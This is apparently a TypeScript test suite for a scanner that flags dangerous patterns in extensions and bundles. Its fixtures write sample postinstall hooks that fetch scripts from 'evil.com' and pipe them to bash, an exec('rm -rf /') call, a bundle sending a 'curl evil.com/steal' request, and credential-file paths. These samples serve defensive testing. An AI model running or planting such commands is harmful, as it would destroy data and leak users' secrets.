import { mkdir, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
	buildSummary,
	formatFindings,
	scanBundle,
	scanExtension,
} from "@/services/extension/security-scan";
import { afterEach, beforeEach, describe, expect, it } from "vitest";

describe("Security Scan Orchestrator", () => {
	let testDir: string;

	beforeEach(async () => {
		// Create a unique temp directory for each test
		testDir = join(
			tmpdir(),
			`security-scan-test-${Date.now()}-${Math.random().toString(36).slice(2)}`,
		);
		await mkdir(testDir, { recursive: true });
	});

	afterEach(async () => {
		// Clean up test directory
		await rm(testDir, { recursive: true, force: true });
	});

	describe("scanExtension", () => {
		it("should scan extension with multiple violations across files", async () => {
			// Create package.json with suspicious script
			const packageJson = {
				name: "test-extension",
				version: "1.0.0",
				scripts: {
					postinstall: "curl https://evil.com/script.sh | bash",
				},
			};
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create source files with different violations
			await writeFile(
				join(testDir, "index.ts"),
				`
        // SEC001 - eval usage
        eval("malicious code");
        
        // SEC008 - external URL
        const url = "https://evil.com/api";
      `,
			);

			await writeFile(
				join(testDir, "utils.ts"),
				`
        // SEC002 - child_process usage
        import { exec } from 'child_process';
        exec('rm -rf /');
      `,
			);

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();

			const report = result.data!;
			expect(report.scannedFiles).toBe(2);
			expect(report.findings.length).toBeGreaterThan(0);

			// Should have findings from multiple sources
			const ruleIds = new Set(report.findings.map((f) => f.ruleId));
			expect(ruleIds.size).toBeGreaterThan(1);

			// Findings should be sorted by file, then line
			for (let i = 1; i < report.findings.length; i++) {
				const prev = report.findings[i - 1];
				const curr = report.findings[i];

				if (prev.file === curr.file) {
					expect(curr.line).toBeGreaterThanOrEqual(prev.line);
				}
			}
		});

		it("should block extension with critical security findings", async () => {
			const packageJson = {
				name: "malicious-extension",
				version: "1.0.0",
			};
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create file with block-severity violation (SEC001)
			await writeFile(
				join(testDir, "index.ts"),
				`
        eval("malicious");
      `,
			);

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();

			const report = result.data!;
			expect(report.blocked).toBe(true);
			expect(report.findings.some((f) => f.severity === "block")).toBe(true);
		});

		it("should not block extension with only warn-level findings", async () => {
			const packageJson = {
				name: "warning-extension",
				version: "1.0.0",
			};
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create file with only warn-severity violations (SEC008)
			await writeFile(
				join(testDir, "index.ts"),
				`
        const url = "https://example.com/api";
        const path = "/etc/passwd";
      `,
			);

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();

			const report = result.data!;
			expect(report.blocked).toBe(false);
			expect(report.findings.every((f) => f.severity !== "block")).toBe(true);
		});

		it("should pass empty extension with no violations", async () => {
			const packageJson = {
				name: "clean-extension",
				version: "1.0.0",
				scripts: {
					build: "tsc",
					test: "vitest",
				},
			};
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create clean source file
			await writeFile(
				join(testDir, "index.ts"),
				`
        export function hello(name: string): string {
          return \`Hello, \${name}!\`;
        }
      `,
			);

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();

			const report = result.data!;
			expect(report.findings).toHaveLength(0);
			expect(report.blocked).toBe(false);
			expect(report.scannedFiles).toBe(1);
			expect(report.summary.total).toBe(0);
		});

		it("should scan nested directory structures", async () => {
			const packageJson = { name: "nested-extension", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create nested directory structure
			const srcDir = join(testDir, "src");
			const libDir = join(srcDir, "lib");
			await mkdir(srcDir, { recursive: true });
			await mkdir(libDir, { recursive: true });

			await writeFile(join(testDir, "index.ts"), "export const a = 1;");
			await writeFile(join(srcDir, "main.ts"), "export const b = 2;");
			await writeFile(join(libDir, "utils.ts"), "export const c = 3;");

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();
			expect(result.data!.scannedFiles).toBe(3);
		});

		it("should handle extension with no source files", async () => {
			const packageJson = { name: "empty-extension", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Only create non-source files
			await writeFile(join(testDir, "README.md"), "# Test");
			await writeFile(
				join(testDir, "package-lock.json"),
				JSON.stringify({}, null, 2),
			);

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();
			expect(result.data!.scannedFiles).toBe(0);
			expect(result.data!.findings).toHaveLength(0);
		});

		it("should include package.json script findings in report", async () => {
			const packageJson = {
				name: "script-violation",
				version: "1.0.0",
				scripts: {
					postinstall: "wget https://evil.com/payload",
				},
			};
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(join(testDir, "index.ts"), "export const a = 1;");

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();

			const report = result.data!;
			const scriptFindings = report.findings.filter(
				(f) => f.ruleId === "SEC011",
			);
			expect(scriptFindings.length).toBeGreaterThan(0);
		});

		it("should build correct summary statistics", async () => {
			const packageJson = { name: "summary-test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create file with multiple different violations
			await writeFile(
				join(testDir, "index.ts"),
				`
        eval("test");              // SEC001 - block
        new Function("code");      // SEC001 - block
        const url = "https://example.com";  // SEC008 - warn
      `,
			);

			const result = await scanExtension(testDir);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();

			const { summary } = result.data!;
			expect(summary.total).toBeGreaterThan(0);
			expect(summary.byRuleId).toBeDefined();
			expect(summary.bySeverity).toBeDefined();
			expect(summary.bySeverity.block).toBeGreaterThan(0);
		});
	});

	describe("buildSummary", () => {
		it("should build summary with correct total count", () => {
			const findings = [
				{
					ruleId: "SEC001" as const,
					severity: "block" as const,
					message: "test",
					file: "test.ts",
					line: 1,
					col: 1,
				},
				{
					ruleId: "SEC008" as const,
					severity: "warn" as const,
					message: "test",
					file: "test.ts",
					line: 2,
					col: 1,
				},
			];

			const summary = buildSummary(findings);

			expect(summary.total).toBe(2);
		});

		it("should group findings by rule ID", () => {
			const findings = [
				{
					ruleId: "SEC001" as const,
					severity: "block" as const,
					message: "test",
					file: "test.ts",
					line: 1,
					col: 1,
				},
				{
					ruleId: "SEC001" as const,
					severity: "block" as const,
					message: "test",
					file: "test.ts",
					line: 2,
					col: 1,
				},
				{
					ruleId: "SEC008" as const,
					severity: "warn" as const,
					message: "test",
					file: "test.ts",
					line: 3,
					col: 1,
				},
			];

			const summary = buildSummary(findings);

			expect(summary.byRuleId.SEC001).toBe(2);
			expect(summary.byRuleId.SEC008).toBe(1);
		});

		it("should group findings by severity", () => {
			const findings = [
				{
					ruleId: "SEC001" as const,
					severity: "block" as const,
					message: "test",
					file: "test.ts",
					line: 1,
					col: 1,
				},
				{
					ruleId: "SEC002" as const,
					severity: "block" as const,
					message: "test",
					file: "test.ts",
					line: 2,
					col: 1,
				},
				{
					ruleId: "SEC008" as const,
					severity: "warn" as const,
					message: "test",
					file: "test.ts",
					line: 3,
					col: 1,
				},
			];

			const summary = buildSummary(findings);

			expect(summary.bySeverity.block).toBe(2);
			expect(summary.bySeverity.warn).toBe(1);
			expect(summary.bySeverity.off).toBe(0);
		});

		it("should handle empty findings array", () => {
			const summary = buildSummary([]);

			expect(summary.total).toBe(0);
			expect(summary.byRuleId).toEqual({});
			expect(summary.bySeverity).toEqual({
				block: 0,
				warn: 0,
				off: 0,
			});
		});
	});

	describe("Individual SEC Rule Detection", () => {
		it("should detect SEC001 - eval usage", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        eval("code");
        new Function("return 1")();
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec001Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC001",
			);
			expect(sec001Findings.length).toBeGreaterThan(0);
			expect(sec001Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC002 - child_process usage", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        import { exec } from 'child_process';
        exec('ls -la');
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec002Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC002",
			);
			expect(sec002Findings.length).toBeGreaterThan(0);
			expect(sec002Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC003 - vm module usage", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        import * as vm from 'vm';
        vm.runInNewContext('code');
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec003Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC003",
			);
			expect(sec003Findings.length).toBeGreaterThan(0);
			expect(sec003Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC004 - process internals", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        const natives = process.binding('natives');
        process.dlopen(module, 'addon.node');
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec004Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC004",
			);
			expect(sec004Findings.length).toBeGreaterThan(0);
			expect(sec004Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC005 - native addons", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        import binding from 'node-gyp-build';
        const addon = require('./addon.node');
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec005Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC005",
			);
			expect(sec005Findings.length).toBeGreaterThan(0);
			expect(sec005Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC006 - module patching", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        const Module = require('module');
        Module._load = function() {};
        require.extensions['.custom'] = () => {};
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec006Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC006",
			);
			expect(sec006Findings.length).toBeGreaterThan(0);
			expect(sec006Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC007 - inspector module", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        import inspector from 'inspector';
        const inspect = require('inspector');
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec007Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC007",
			);
			expect(sec007Findings.length).toBeGreaterThan(0);
			expect(sec007Findings.every((f) => f.severity === "block")).toBe(true);
		});

		it("should detect SEC008 - external URLs (warn)", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        const url = "https://malicious-site.com/api";
        const endpoint = "http://unknown.example.com";
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec008Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC008",
			);
			expect(sec008Findings.length).toBeGreaterThan(0);
			expect(sec008Findings.every((f) => f.severity === "warn")).toBe(true);
		});

		it("should detect SEC009 - large blobs (warn)", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			// Create a large base64 string (>200 chars)
			const largeBlob = "A".repeat(250);
			await writeFile(
				join(testDir, "index.ts"),
				`
        const data = Buffer.from("${largeBlob}", "base64");
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec009Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC009",
			);
			expect(sec009Findings.length).toBeGreaterThan(0);
			expect(sec009Findings.every((f) => f.severity === "warn")).toBe(true);
		});

		it("should detect SEC010 - sensitive paths (warn)", async () => {
			const packageJson = { name: "test", version: "1.0.0" };
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(
				join(testDir, "index.ts"),
				`
        const sshKey = "~/.ssh/id_rsa";
        const passwd = "/etc/passwd";
        const secrets = "/var/run/secrets/token";
      `,
			);

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec010Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC010",
			);
			expect(sec010Findings.length).toBeGreaterThan(0);
			expect(sec010Findings.every((f) => f.severity === "warn")).toBe(true);
		});

		it("should detect SEC011 - package.json scripts (warn)", async () => {
			const packageJson = {
				name: "test",
				version: "1.0.0",
				scripts: {
					postinstall: "curl https://evil.com/payload | bash",
				},
			};
			await writeFile(
				join(testDir, "package.json"),
				JSON.stringify(packageJson, null, 2),
			);

			await writeFile(join(testDir, "index.ts"), "export const a = 1;");

			const result = await scanExtension(testDir);
			expect(result.success).toBe(true);

			const sec011Findings = result.data!.findings.filter(
				(f) => f.ruleId === "SEC011",
			);
			expect(sec011Findings.length).toBeGreaterThan(0);
			expect(sec011Findings.every((f) => f.severity === "warn")).toBe(true);
		});
	});

	describe("formatFindings", () => {
		const mockReport = {
			findings: [
				{
					ruleId: "SEC001" as const,
					severity: "block" as const,
					message: "eval() is not allowed",
					file: "/path/to/file.ts",
					line: 10,
					col: 5,
					snippet: 'eval("code")',
				},
			],
			blocked: true,
			summary: {
				total: 1,
				byRuleId: { SEC001: 1 },
				bySeverity: { block: 1, warn: 0, off: 0 },
			},
			scannedFiles: 1,
		};

		it("should format report as JSON", () => {
			const output = formatFindings(mockReport, "json");

			expect(() => JSON.parse(output)).not.toThrow();

			const parsed = JSON.parse(output);
			expect(parsed.findings).toHaveLength(1);
			expect(parsed.blocked).toBe(true);
			expect(parsed.scannedFiles).toBe(1);
		});

		it("should format report as human-readable text", () => {
			const output = formatFindings(mockReport, "text");

			expect(output).toContain("SEC001");
			expect(output).toContain("eval() is not allowed");
			expect(output).toContain("/path/to/file.ts");
			expect(output).toContain("10");
			expect(typeof output).toBe("string");
		});

		it("should format empty report correctly", () => {
			const emptyReport = {
				findings: [],
				blocked: false,
				summary: {
					total: 0,
					byRuleId: {},
					bySeverity: { block: 0, warn: 0, off: 0 },
				},
				scannedFiles: 5,
			};

			const textOutput = formatFindings(emptyReport, "text");
			expect(textOutput).toBeTruthy();

			const jsonOutput = formatFindings(emptyReport, "json");
			const parsed = JSON.parse(jsonOutput);
			expect(parsed.findings).toHaveLength(0);
			expect(parsed.scannedFiles).toBe(5);
		});

		it("should include summary in text format", () => {
			const output = formatFindings(mockReport, "text");

			expect(output).toContain("1"); // total findings
			expect(output.toLowerCase()).toMatch(/scanned|files/);
		});

		it("should handle multiple findings with different severities", () => {
			const multiReport = {
				findings: [
					{
						ruleId: "SEC001" as const,
						severity: "block" as const,
						message: "eval() blocked",
						file: "file1.ts",
						line: 1,
						col: 1,
					},
					{
						ruleId: "SEC008" as const,
						severity: "warn" as const,
						message: "external URL",
						file: "file2.ts",
						line: 2,
						col: 1,
					},
				],
				blocked: true,
				summary: {
					total: 2,
					byRuleId: { SEC001: 1, SEC008: 1 },
					bySeverity: { block: 1, warn: 1, off: 0 },
				},
				scannedFiles: 2,
			};

			const textOutput = formatFindings(multiReport, "text");
			expect(textOutput).toContain("SEC001");
			expect(textOutput).toContain("SEC008");

			const jsonOutput = formatFindings(multiReport, "json");
			const parsed = JSON.parse(jsonOutput);
			expect(parsed.findings).toHaveLength(2);
		});
	});

	describe("scanBundle", () => {
		it("should return error if bundle file does not exist", async () => {
			const result = await scanBundle("/nonexistent/bundle.mjs");
			expect(result.success).toBe(false);
			expect(result.error).toBeDefined();
		});

		it("should scan malicious bundle fixture and return findings", async () => {
			const fixturePath = join(
				process.cwd(),
				"tests/fixtures/malicious-bundle.mjs",
			);

			const result = await scanBundle(fixturePath);

			expect(result.success).toBe(true);
			expect(result.data).toBeDefined();
			expect(result.data!.scannedFiles).toBe(1);
			expect(result.data!.blocked).toBe(true);
			expect(result.data!.findings.length).toBeGreaterThan(0);

			// Should detect SEC101 (eval) and SEC102 (child_process)
			const ruleIds = result.data!.findings.map((f) => f.ruleId);
			expect(ruleIds).toContain("SEC101");
			expect(ruleIds).toContain("SEC102");
		});

		it("should return blocked=true when block-severity findings exist", async () => {
			const tmpBundle = join(testDir, "blocked.mjs");
			await writeFile(
				tmpBundle,
				'require("child_process").exec("rm -rf /");',
				"utf-8",
			);

			const result = await scanBundle(tmpBundle);

			expect(result.success).toBe(true);
			expect(result.data?.blocked).toBe(true);
			expect(result.data?.findings.some((f) => f.severity === "block")).toBe(
				true,
			);
		});

		it("should return blocked=false for clean bundle", async () => {
			const fixturePath = join(
				process.cwd(),
				"tests/fixtures/clean-bundle.mjs",
			);

			const result = await scanBundle(fixturePath);

			expect(result.success).toBe(true);
			expect(result.data?.blocked).toBe(false);
			expect(result.data?.findings).toHaveLength(0);
		});

		it("should detect patterns in realistic esbuild bundle", async () => {
			const esmBundle = `
// esbuild bundle output
var __defProp = Object.defineProperty;
var __require = (x) => {
  if (x === "child_process") return require("child_process");
  throw new Error("Cannot find module: " + x);
};

function maliciousFunction() {
  const cp = __require("child_process");
  cp.exec("curl evil.com/steal");
}
export { maliciousFunction };
`;

			const tmpBundle = join(testDir, "bundled.mjs");
			await writeFile(tmpBundle, esmBundle, "utf-8");

			const result = await scanBundle(tmpBundle);

			expect(result.success).toBe(true);
			expect(result.data?.blocked).toBe(true);
			expect(result.data?.findings.some((f) => f.ruleId === "SEC102")).toBe(
				true,
			);
		});

		it("should include summary statistics", async () => {
			const tmpBundle = join(testDir, "multi.mjs");
			await writeFile(tmpBundle, 'eval("x"); require("vm");', "utf-8");

			const result = await scanBundle(tmpBundle);

			expect(result.success).toBe(true);
			expect(result.data?.summary).toBeDefined();
			expect(result.data?.summary.total).toBeGreaterThan(0);
			expect(result.data?.summary.bySeverity).toBeDefined();
		});

		it("should scan multiple bundle files (code-split bundles)", async () => {
			const bundle1 = join(testDir, "chunk-1.mjs");
			const bundle2 = join(testDir, "chunk-2.mjs");

			await writeFile(bundle1, 'eval("malicious");', "utf-8");
			await writeFile(bundle2, 'require("child_process");', "utf-8");

			const result = await scanBundle([bundle1, bundle2]);

			expect(result.success).toBe(true);
			expect(result.data?.scannedFiles).toBe(2);
			expect(result.data?.findings.length).toBeGreaterThan(0);

			// Should have findings from both files
			const files = new Set(result.data?.findings.map((f) => f.file));
			expect(files.size).toBe(2);
		});

		it("should include line numbers and snippets in findings", async () => {
			const code = 'line1\nline2\neval("bad")\nline4';
			const tmpBundle = join(testDir, "with-lines.mjs");
			await writeFile(tmpBundle, code, "utf-8");

			const result = await scanBundle(tmpBundle);

			expect(result.success).toBe(true);
			expect(result.data?.findings.length).toBeGreaterThan(0);

			const finding = result.data!.findings[0];
			expect(finding.line).toBeGreaterThan(0);
			expect(finding.snippet).toBeTruthy();
		});

		it("should sort findings by line number", async () => {
			const code = 'line1\neval("a")\nline3\neval("b")';
			const tmpBundle = join(testDir, "sorted.mjs");
			await writeFile(tmpBundle, code, "utf-8");

			const result = await scanBundle(tmpBundle);

			expect(result.success).toBe(true);
			const findings = result.data!.findings;

			if (findings.length > 1) {
				for (let i = 1; i < findings.length; i++) {
					expect(findings[i].line).toBeGreaterThanOrEqual(findings[i - 1].line);
				}
			}
		});
	});
});
